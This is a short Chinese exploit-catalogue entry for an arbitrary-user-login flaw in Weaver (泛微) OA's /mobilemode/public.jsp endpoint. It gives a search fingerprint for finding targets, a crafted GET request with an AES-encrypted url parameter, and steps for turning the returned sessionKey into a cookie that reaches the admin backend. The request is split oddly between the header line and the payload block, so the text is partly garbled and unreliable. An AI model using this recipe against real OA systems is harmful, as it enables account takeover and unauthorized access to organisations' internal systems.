# 泛微OAmobilemodepublic.jsp任意⽤户登陆

- **系统**：泛微OA　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app="泛微-EMobile"`
- **请求**：`GET /mobilemode/public.jsp?from=QRCode&url=6113E071490B2269235AA57CBC17326A3FE4B32AE70B304398591449D84`

**请求体 / payload**
```
漏洞细节
这⾥为AES解密，其中key为security.key，新版本的这个都是随机的，所以需要先获取到 security.key才可以实现任意⽤户登陆
也就是说这⾥的url经过aes解密之后需要⽣成⻓度为3的数组，其中第⼀个为user_id
最后直接返回sessionKey，后⾯在找接⼝sessionKey去换cookie既可以直接上后台 数据包
CFD56&a=.swf HTTP/1.1
```
- **预期**：200　|　—